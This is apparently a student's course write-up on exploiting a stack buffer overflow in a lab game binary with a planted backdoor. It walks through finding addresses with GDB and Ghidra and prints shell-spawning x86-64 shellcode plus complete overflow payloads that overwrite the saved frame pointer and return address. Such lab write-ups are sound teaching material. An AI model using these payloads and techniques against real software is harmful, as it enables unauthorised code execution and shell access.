---
title: "Duke Nukem II"
layout : blog-posts
permalink: /duke-nukem/
---
<body>
    <div class="container">
        <h1>Buffer Overflow Attacks and Exploitation</h1>
        <p>Buffer overflow attacks are a type of software vulnerability where an attacker can overwrite memory beyond a buffer's boundary. This can lead to unauthorized code execution, crashes, or other malicious behavior.</p>

        <h2>Types of Buffer Overflow Attacks</h2>
        <ul>
            <li><strong>Stack-based buffer overflows:</strong> Overwriting the call stack of a program to redirect code execution.</li>
            <li><strong>Heap-based buffer overflows:</strong> Exploiting dynamic memory allocations to corrupt heap metadata or redirect control flow.</li>
        </ul>

        <h2>Exploitation Approaches Taught in Class</h2>
        <p>In class, we covered three main approaches for exploiting buffer overflow vulnerabilities:</p>
        <ul>
            <li><strong>Ballpeen Hammer:</strong> A precise exploitation method requiring detailed memory analysis and controlled payloads.</li>
            <li><strong>Sledgehammer:</strong> A brute-force approach with less precision but potentially effective in simpler scenarios.</li>
            <li><strong>Tweezer:</strong> A highly targeted method requiring in-depth debugging and analysis of specific instructions.</li>
        </ul>

        <h2>Homework Overview</h2>
        <p>Our homework focuses on exploiting a vulnerable binary by analyzing and leveraging a stack-based buffer overflow. Key tasks include:</p>
        <ul>
            <li>Setting up the binary for analysis using tools like GDB and Ghidra.</li>
            <li>Identifying and triggering the backdoor function in the binary.</li>
            <li>Developing and deploying payloads using the ballpeen hammer and sledgehammer approaches.</li>
        </ul>

        <h3>Resources Needed</h3>
        <ul>
            <li>GDB for debugging.</li>
            <li>Ghidra for binary analysis.</li>
            <li>Sample binary and exploit wrapper files.</li>
        </ul>

        <h3>Video of Backdoor Function Execution</h3>
        <p>A demonstration video showcasing the backdoor function being triggered in the game will be provided as part of the homework submission.</p>

        <h2>Ballpeen Hammer Approach</h2>
        <ol>
            <li>Configure remote debug configuration in Eclipse.</li>
            <li>Start the gdbserver on port <code>2345</code> (default port for gdbserver).</li>
            <li>Start debugging and play the game to trigger the backdoor.</li>
            <li>Suspend the program in Eclipse and analyze the stack:</li>
                <ul>
                    <li>First address on the stack: <code>0x55555574933e</code></li>
                    <li>Second address (wrapper function): <code>0x5555557492a2</code></li>
                </ul>
            <li>Set breakpoints at the backdoor and vulnerable function call addresses.</li>
            <li>Suspend the program in eclipse. On the left, the first address (in memory : 0x55555574933e) at the top of the stack is where the backdoor function is being called from (can be verified by tracing the commands being executed -- as seen in the decompiler view for the backdoor function in ghidra).
                This means that the second address (0x5555557492a2) on the call stack would be inside the function that is calling this backdoor function (called the wrapper function -- which also calls the vulnerable_fn function whose address in memory is 0x555555749774). This can be verified from the fact that there is a call to the address (in memory) of the backdoor_func function (0x5555557492e2) and vulnerable_fn function (0x555555749774). 
            </li>
            <li>Put two breakpoints : one at the call address of the backdoor_func function and one at the call address of the vulnerable_fn function.</li>
            <li>There are a couple of things we need to note down to mount the ballpeen stacksmashing exploit. These include :
                <ol>
                    <li>Shellcode -- to spawn a shell
                        The shellcode can be retrieved from our previous exercise (https://gitlab.com/softwaresecuritylearning/stacksmashexploit/-/blob/master/src/exploitWrapper.c?ref_type=heads) :
                        <pre><code>\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\x48\x89\xd7\xb0\x3c\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</code></pre>
                            The length of this shellcode is 63 bytes.
                    </li>
                    <li>
                        Return address of the destination buffer that needs to be overwritten -- which the stack pointer will return to
The return address of the destination buffer :
Navigate to the call address of the vulnerable_fn. Scroll down a bit. You'll be able to see where the memcpy function is being called from. Put a breakpoint at the memcpy function. Resume the program.
We can input some dummy values here for now since we're only looking for the RA of the dst buffer.
Suspend the program again. Put the debugger in instruction stepping mode, and STEP INTO the memcpy function. Navigate to the registers tab and note down the values of the rbp and the rdi of the buffer. <br>
address of memcpy in memory : 0x55555557ada0 <br>
address of rdi after stepping in memcpy once : 0x7fffffffc170 <br>
address of rbp after stepping in memcpy once : 0x7fffffffc2f0
                    </li>
                    <li>
                        Length of the space in memory that needs to be overwritten till we reach the rbp value -- this will be the length of the shellcode + length of the spacer
We can calculate the length of the destination buffer being passed to memcpy now = rbp - rdi = 384
                    </li>
                    <li>
                        Spacer -- NOP commands till we reach the rbp value that needs to be overwritten
We know that the shellcode would occupy 63 bytes of this buffer. So the length of the spacer (nops) = 384 - 63 = 321
spacer : \x90 * 321 :
<pre><code>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</code></pre>
                    </li>
                    <li>
                        This buffer would be accompanied with the rbp and RA we need to overwrite i.e. the rbp of memcpy and rdi of the buffer after stepping into memcpy once.
Therefore, input tainted buffer : shellcode + spacer + rbp + RA :
<pre><code>\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\x48\x89\xd7\xb0\x3c\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xc2\xff\xff\xff\x7f\x00\x00\x70\xc1\xff\xff\xff\x7f\x00\x00
</code></pre>
Notice that we have appended 2 bytes of 0s to the values of rdi and rbp (to make them 8 bytes in total). Make sure to type them in reverse order as shown above according to the little endian format.
                    </li>
                </ol>
            </li>
                </ul>
        </ol>

        <h2>Sledgehammer Approach</h2>
        <p>In this method, we fill the buffer with random data of length 400 and observe its effects. The one I used to achieve this is: </p>
        <pre><code>\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\x48\x89\xd7\xb0\x3c\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
        </code></pre>
        <h2>Some Important Memory Addresses that might be useful while debugging</h2>
        <ul>
            <li>
                address of the backdoor_func function in memory : <code>0x5555557492e2</code>
            </li>
            <li>
                address where it is being called from : <code>000055555574929d</code>
            </li>
            <li>
                address of the vulnerable_fn function in memory : <code>0x555555749774</code>
            </li>
            <li>
                address where it is being called from : <code>00005555557492b4</code>
            </li>
            <li>
                rbp of the vulnerable_fn : <code>0x7fffffffc330</code>
            </li>
            <li>
                rdi of the vulnerable_fn value : <code>0x7fffffffc170</code>

            </li>
            
   
        </ul>
    </div>

</body>


</html>